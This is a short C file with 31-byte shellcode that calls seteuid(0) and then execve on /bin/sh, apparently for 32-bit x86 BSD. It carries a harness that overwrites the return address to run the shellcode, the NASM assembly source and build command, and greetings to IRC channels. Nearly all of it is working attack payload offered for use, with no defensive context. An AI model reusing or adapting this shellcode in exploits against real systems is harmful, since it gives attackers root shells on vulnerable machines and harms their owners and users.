/*
simply	execve_binsh+seteuid(0) shellcode in 31 bytes
written on nasm - my first nasm exp.
greetz2:
	mig	#darknet /EFnet.org
	nerf	#nerf	 /EFnet.org
				dev0id #rus-sec /EFnet.org (rootteam.void.ru)
*/

char shellcode[] =
	"\x31\xc0\x50\xb0\xb7\xcd\x80\x50\x31\xc0\x50\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd"
	"\x80";
void
main()
{
	int *ret;
	ret=(int*)&ret+2;
	(*ret)=(int)shellcode;
}

/****************************************
--------------start---------------------
BITS 32

main:
	xor		eax,eax
	push		eax
	mov		al,183
	int		0x80
	push		eax
	xor		eax,eax
	push		eax
	push long	0x68732f2f
	push long	0x6e69622f
	mov		ebx,esp
	push		eax
	push		esp
	push		ebx
	mov		al,59
	push		eax
	int		0x80

	;mov		al,1    need exit? I do not!
	;push		eax
	;int		0x80
---------------end----------------------
compilation:
	%nasm code.s -o code
****************************************/